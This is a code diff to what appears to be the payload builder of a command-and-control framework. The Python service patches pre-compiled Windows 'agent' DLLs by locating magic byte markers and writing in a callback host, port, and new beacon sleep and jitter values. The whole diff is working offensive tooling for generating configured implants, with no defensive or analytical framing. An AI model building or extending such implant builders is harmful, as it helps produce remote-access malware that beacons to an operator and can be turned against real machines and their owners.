@@ -24,10 +24,14 @@ DIST_DIR   = _REPO_ROOT / "AgentWindows" / "dist"
 
 # Magic markers embedded in the compiled DLL by AgentConfig.cpp.
 # Must match the byte literals in AgentConfig.cpp exactly.
-_HOST_MAGIC      = b'\xDE\xAD\xBE\xEF\xC2\xC2\xC2\xC2'
-_PORT_MAGIC      = b'\xDE\xAD\xBE\xEF\xC2\xC2\xC2\xC3'
-_HOST_FIELD_SIZE = 64   # bytes reserved after the magic (max 63-char string + null)
-_PORT_FIELD_SIZE = 8    # bytes reserved after the magic (max 5-digit port + null)
+_HOST_MAGIC        = b'\xDE\xAD\xBE\xEF\xC2\xC2\xC2\xC2'
+_PORT_MAGIC        = b'\xDE\xAD\xBE\xEF\xC2\xC2\xC2\xC3'
+_SLEEP_MAGIC       = b'\xDE\xAD\xBE\xEF\xC2\xC2\xC2\xC4'
+_JITTER_MAGIC      = b'\xDE\xAD\xBE\xEF\xC2\xC2\xC2\xC5'
+_HOST_FIELD_SIZE   = 64  # bytes reserved after the magic (max 63-char string + null)
+_PORT_FIELD_SIZE   = 8   # bytes reserved after the magic (max 5-digit port + null)
+_SLEEP_FIELD_SIZE  = 8   # bytes reserved after the magic (max 7-digit ms + null)
+_JITTER_FIELD_SIZE = 8   # bytes reserved after the magic (max 7-digit ms + null)
 
 # Pre-compiled base DLLs, one per architecture, placed in AgentWindows/dist/
 _ARCH_DLL: dict[str, Path] = {
@@ -54,8 +58,8 @@ class BuilderService:
             "archs": archs,
         }
 
-    def create_build(self, host: str, port: int, arch: str) -> Build:
-        build = Build(host, port, arch)
+    def create_build(self, host: str, port: int, arch: str, sleep_ms: int = 5000, jitter_ms: int = 1000) -> Build:
+        build = Build(host, port, arch, sleep_ms, jitter_ms)
         with self._lock:
             self._builds[build.id] = build
         # Patching is instant — run synchronously, no background thread needed
@@ -94,7 +98,7 @@ class BuilderService:
                     f"  AgentWindows/dist/agent_{build.arch.lower()}.dll"
                 )
 
-            patched = _patch_dll(base_dll.read_bytes(), build.host, build.port)
+            patched = _patch_dll(base_dll.read_bytes(), build.host, build.port, build.sleep_ms, build.jitter_ms)
 
             out_dir = BUILDS_DIR / build.id
             out_dir.mkdir(parents=True, exist_ok=True)
@@ -111,7 +115,18 @@ class BuilderService:
                 build.error_log   = str(e)
 
 
-def _patch_dll(data: bytes, host: str, port: int) -> bytes:
+def _patch_field(buf: bytearray, magic: bytes, value_bytes: bytes, field_size: int, field_name: str) -> None:
+    idx = bytes(buf).find(magic)
+    if idx == -1:
+        raise ValueError(
+            f"{field_name} magic marker not found in DLL. "
+            "Make sure the DLL was compiled with AgentConfig.cpp included in the project."
+        )
+    start = idx + len(magic)
+    buf[start:start + field_size] = value_bytes + b'\x00' * (field_size - len(value_bytes))
+
+
+def _patch_dll(data: bytes, host: str, port: int, sleep_ms: int = 5000, jitter_ms: int = 1000) -> bytes:
     buf = bytearray(data)
 
     host_bytes = host.encode('ascii')
@@ -122,28 +137,17 @@ def _patch_dll(data: bytes, host: str, port: int) -> bytes:
     if len(port_bytes) > _PORT_FIELD_SIZE - 1:
         raise ValueError(f"Port value out of range (max {_PORT_FIELD_SIZE - 1} digits)")
 
-    # Patch host
-    idx = bytes(buf).find(_HOST_MAGIC)
-    if idx == -1:
-        raise ValueError(
-            "Host magic marker not found in DLL. "
-            "Make sure the DLL was compiled with AgentConfig.cpp included in the project."
-        )
-    start = idx + len(_HOST_MAGIC)
-    buf[start:start + _HOST_FIELD_SIZE] = (
-        host_bytes + b'\x00' * (_HOST_FIELD_SIZE - len(host_bytes))
-    )
+    sleep_bytes = str(sleep_ms).encode('ascii')
+    if len(sleep_bytes) > _SLEEP_FIELD_SIZE - 1:
+        raise ValueError(f"Sleep value too large (max {_SLEEP_FIELD_SIZE - 1} digits)")
 
-    # Patch port
-    idx = bytes(buf).find(_PORT_MAGIC)
-    if idx == -1:
-        raise ValueError(
-            "Port magic marker not found in DLL. "
-            "Make sure the DLL was compiled with AgentConfig.cpp included in the project."
-        )
-    start = idx + len(_PORT_MAGIC)
-    buf[start:start + _PORT_FIELD_SIZE] = (
-        port_bytes + b'\x00' * (_PORT_FIELD_SIZE - len(port_bytes))
-    )
+    jitter_bytes = str(jitter_ms).encode('ascii')
+    if len(jitter_bytes) > _JITTER_FIELD_SIZE - 1:
+        raise ValueError(f"Jitter value too large (max {_JITTER_FIELD_SIZE - 1} digits)")
+
+    _patch_field(buf, _HOST_MAGIC,   host_bytes,   _HOST_FIELD_SIZE,   "Host")
+    _patch_field(buf, _PORT_MAGIC,   port_bytes,   _PORT_FIELD_SIZE,   "Port")
+    _patch_field(buf, _SLEEP_MAGIC,  sleep_bytes,  _SLEEP_FIELD_SIZE,  "Sleep")
+    _patch_field(buf, _JITTER_MAGIC, jitter_bytes, _JITTER_FIELD_SIZE, "Jitter")
 
     return bytes(buf)
